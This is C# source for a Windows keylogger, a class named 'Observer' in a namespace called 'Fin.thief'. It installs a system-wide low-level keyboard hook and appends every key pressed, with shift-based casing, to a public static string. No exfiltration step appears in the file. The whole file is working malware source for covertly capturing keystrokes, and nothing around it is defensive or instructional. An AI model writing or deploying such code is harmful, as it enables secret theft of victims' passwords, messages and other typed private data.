using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
namespace Fin.thief
{
    public class Observer 
    {
        
        
        public static string keys = "";
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static int WM_KEYUP = 0x0101; //0101
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static bool shift = false;
        private bool cap = false;
        

        public Observer()
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            int vkCode = Marshal.ReadInt32(lParam);
           // Console.Out.WriteLine(wParam);
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            { 
           
                
                if (((Keys) vkCode).ToString().ToLower().Contains("shift"))
                {
                    
                    shift = true;
                }
                else
                {

                    string key = ((Keys) vkCode).ToString();
                    if (!shift)
                    {
                        key = key.ToLower();
                    }

                    keys += "/" + key;
                }
                
              
                
            }else if (nCode >= 0 && wParam == (IntPtr) WM_KEYUP)
            {
                if (((Keys) vkCode).ToString().ToLower().Contains("shift"))
                {
                    shift = false;
                }
              
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
        
        
        
    }
